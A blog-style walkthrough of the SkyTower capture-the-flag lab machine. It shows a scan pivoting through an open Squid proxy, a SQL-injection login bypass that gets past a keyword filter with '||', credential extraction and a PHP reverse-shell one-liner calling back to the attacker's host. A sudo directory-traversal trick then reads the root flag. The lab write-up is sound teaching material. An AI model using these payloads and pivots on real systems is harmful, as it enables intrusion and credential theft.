---
layout: post
title: SkyTower CTF Walkthrough
date: 2017-08-22
categories:
  - security
  - ctf
  - walkthrough
tags:
  - skytower
  - vulnhub
---
## Service Discovery
A port scan using Nmap [`nmap -sS -sV -sC 10.2.0.104`] showed three services running on the host machine:

```
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Site doesn't have a title (text/html).
3128/tcp open     http-proxy Squid http proxy 3.1.20
|_http-server-header: squid/3.1.20
|_http-title: ERROR: The requested URL could not be retrieved
```

As Squid wasn't configured to require any authentication, I executed another port scan, but against `127.0.0.1` via the proxy by running `nmap -sS -sV 127.0.0.1 --proxy http://10.2.0.104:3128`:

```
PORT     STATE SERVICE    VERSION
22/tcp   open  tcpwrapped
5432/tcp open  tcpwrapped
```

This suggests that although SSH connections are being refused externally, they are possible via the proxy. In addition, another port is shown as open locally; possibly PostgreSQL.

In order to check if Apache was setup to serve an internal website if accessing via `localhost`, I setup FireFox to proxy via Squid and then compared the website being served via `http://localhost` over the proxy, and from `http://10.2.0.104` externally. Both websites being served were the same, suggesting there was no vhost setup.

## Website Analysis & Exploitation
Entering a single quote into the e-mail field of the login form and submitting it revealed a MySQL error, revealing that the form is vulnerable to an SQL injection.

I tried a few different injections, all of which were returning syntax errors; as if characters were being removed.

Doing a bit more testing, I tried a UNION and added an invalid keyword at the start to widen the range of the query that is echoed back in the error message:

```
asd' test union select 1, 2, 3, 4 #
```

When submitting this, I saw that the commas between the fields were being removed as well as the SELECT keyword:

```
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'test union 1 2 3 4 #' and password=''' at line 1]
```

A similar test with the injection I was using to try and bypass authentication (`'or'a'='a`) revealed the same was happening with the OR operator, i.e. that it was being stripped out.

In case the operation handling the character stripping couldn't handle null bytes, I used Burp's repeater to insert a null byte prior to the injection and resubmitted, but it didn't help escape the normalisation:

![Burp Repeater](/assets/images/skytower-ctf-walkthrough/burp.png)

In addition, I also tried alternating the casing, in case the search pattern was case sensitive, but this also had no effect.

As there was seemingly no means of working around the character stripping, I tried replacing the OR operator with MySQL's alternative operator (`||`) and found that it wasn't in the blacklist, which allowed me to gain access by submitting `a'||'a'='a'#` as the e-mail.

![Auth Bypass](/assets/images/skytower-ctf-walkthrough/account.png)

## Getting a Shell
Using the SSH credentials found by bypassing the website's authentication (`john:hereisjohn`), I configured proxychains to use the Squid server by adding `http 10.2.0.104 3128` to the end of `/etc/proxychains.conf` and then accessed SSH through proxychains:

```shell_session
root@kali:~# proxychains ssh john@10.2.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.2.0.104:3128-<><>-10.2.0.104:22-<><>-OK
john@10.2.0.104's password:
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 20 07:41:08 2014

Funds have been withdrawn
Connection to 10.2.0.104 closed.
```

As can be seen in the output above, before being presented with a prompt, the session was automatically closed by the host. However, as it's possible to specify a command to be automatically executed when using SSH, I was able to get a shell by connecting using `proxychains ssh john@10.2.0.104 /bin/bash`.

Listing the contents of `/home` reveals two other users that possibly exist on the website; `sara` and `william`:

```
drwxr-xr-x  5 root    root    4096 Jun 20  2014 .
drwxr-xr-x 24 root    root    4096 Jun 20  2014 ..
drwx------  2 john    john    4096 Jun 20  2014 john
drwx------  2 sara    sara    4096 Jun 20  2014 sara
drwx------  2 william william 4096 Jun 20  2014 william
```

Using the previously identified SQL injection with these usernames and the `skytech.com` domain that was revealed when using the initial SQL injection, I was able to modify it to extract their SSH credentials by using `sara@skytech.com'#` and `william@skytech.com'#` as the e-mail address in each request, which gave me the following credentials:

* `sarah:ihatethisjob`
* `william:senseable`

In order to try and harvest more credentials, I took a look at the contents of `/var/www/login.php` to find the MySQL credentials, which were revealed on line 3:

```php
$db = new mysqli('localhost', 'root', 'root', 'SkyTech');
```

Next, to enable me to use the backspace key to correct typos instead of having to keep re-typing commands, I created a reverse shell using PHP by running `ncat -v -l -p 4444` locally and running `php -r '$sock=fsockopen("10.2.0.3",4444);exec("/bin/sh -i <&3 >&3 2>&3");' &` on the host shell.

Once I had a slightly upgraded shell, I proceeded to enumerate the MySQL database to see what other credentials I could find, but there were no more users to be found:

```shell_session
$ mysql -u root -p -e 'show databases;'
Enter password: root
Database
information_schema
SkyTech
mysql
performance_schema
$ mysql -u root -p -e 'show tables;' SkyTech;
Enter password: root
Tables_in_SkyTech
login
$ mysql -u root -p -e 'select * from login' SkyTech
Enter password: root
id	email	password
1	john@skytech.com	hereisjohn
2	sara@skytech.com	ihatethisjob
3	william@skytech.com	senseable
$
```

In order to verify there was nothing missed by Nmap earlier, I also checked the currently active connections by running `netstat -a`, and confirmed there was nothing running that I wasn't already aware of:

```
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 *:ssh                   *:*                     LISTEN     
tcp        0      0 localhost:mysql         *:*                     LISTEN     
tcp        0      0 10.2.0.104:ssh          10.2.0.104:43891        ESTABLISHED
tcp6       0      0 [::]:http               [::]:*                  LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
tcp6       0      0 [::]:3128               [::]:*                  LISTEN     
tcp6       0      0 [UNKNOWN]:3128          [UNKNOWN]:40838         ESTABLISHED
tcp6       0      0 [UNKNOWN]:43891         [UNKNOWN]:ssh           ESTABLISHED
```

A quick look at the Apache configuration in `/etc/apache2/sites-enabled` also confirmed my previous presumption that there was no vhost switching present:

```apache
<VirtualHost *:80>
	ServerAdmin webmaster@localhost

	DocumentRoot /var/www
	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory /var/www/>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>

	ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
	<Directory "/usr/lib/cgi-bin">
		AllowOverride None
		Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
		Order allow,deny
		Allow from all
	</Directory>

	ErrorLog ${APACHE_LOG_DIR}/error.log

	# Possible values include: debug, info, notice, warn, error, crit,
	# alert, emerg.
	LogLevel warn

	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

## Getting Interactive Shell & Rooting
Now that I had a few different sets of credentials at my disposal, I wanted to upgrade to an interactive shell and check out what sudo privileges each user had, to see if there was any low hanging fruit.

Usually, I'd do this using Python by running `python -c 'import pty; pty.spawn("/bin/bash")'`, but Python wasn't installed on the host; which meant I had to figure out what was killing the SSH connections.

I started [and finished] by looking in `.bashrc` and found the last three lines to read:

```
echo
echo  "Funds have been withdrawn"
exit
```

As I couldn't use `nano` to edit the file, I used `head` to remove the last three lines and output it back into `.bashrc`:

```
head -n -3 .bashrc > .bashrc
```

After doing this, I tried to login again, and successfully got an interactive shell as `john`:

```shell_session
root@kali:~# proxychains ssh john@10.2.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.2.0.104:3128-<><>-10.2.0.104:22-<><>-OK
john@10.2.0.104's password:
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 20 17:51:47 2017 from 10.2.0.104
john@SkyTower:~$ sudo -l
[sudo] password for john:
Sorry, user john may not run sudo on SkyTower.
john@SkyTower:~$
```

Now that I had the interactive shell, I ran `sudo -l` to view John's privileges, but the account was unable to execute any commands using sudo, so I moved on to the `sara` account.

This account also had the same issue with being instantly disconnected, so I executed the same command as previously used on the `john` account (`proxychains ssh sara@10.2.0.104 "head -n -3 .bashrc > .bashrc"`) and then connected with an interactive shell.

Once in, I found that the `sara` account had the ability to run `cat /accounts/*` and `ls /accounts/*`:

```shell_session
sara@SkyTower:~$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```

Both these commands allow for directory traversal, as `..` can be used to get to the parent directory, which meant I was able to get the listing of `/root` and view the flag:

```shell_session
sara@SkyTower:~$ sudo ls /accounts/../root
flag.txt
sara@SkyTower:~$ sudo cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
```

Now that I had the password for the `root` user, I was able to login as `root` and complete the challenge:

```shell_session
root@kali:~# proxychains ssh root@10.2.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.2.0.104:3128-<><>-10.2.0.104:22-<><>-OK
root@10.2.0.104's password:
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 20 09:01:28 2014
root@SkyTower:~#
```
